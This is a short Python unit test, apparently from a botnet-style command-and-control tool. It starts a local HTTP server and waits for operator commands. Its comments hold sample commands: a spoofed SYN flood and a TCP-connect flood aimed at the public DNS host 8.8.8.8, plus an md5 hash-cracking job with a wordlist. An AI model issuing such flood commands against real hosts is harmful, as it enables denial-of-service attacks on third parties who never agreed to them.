'''
Created on Dec 14, 2013

@author: root
'''
import unittest
from domain.Controller import Controller
from domain.Commander import Commander
from domain.CustomHTTPServer import CustomHTTPServer

class Test(unittest.TestCase):


    def testCommandInput(self):
        #r ddos_start 10000 99999 --tcp -S random -p 80 -g random --flags SYN --delay 10ms -c 20 8.8.8.8
        #r ddos_start 10000 99999 --tcp-connect -p 80 -g random --delay 10ms -c 20 8.8.8.8
        #r hcrack_start 10000 99999 md5 wlist.txt hashes.txt
        #l list-clients
        server = CustomHTTPServer('127.0.0.1', 80)
        server.startServer()
        controller = Controller(Commander(server))
        
        controller.waitAction()
        controller.waitAction()
        controller.waitAction()

if __name__ == "__main__":
    #import sys;sys.argv = ['', 'Test.testCommandInput']
    unittest.main()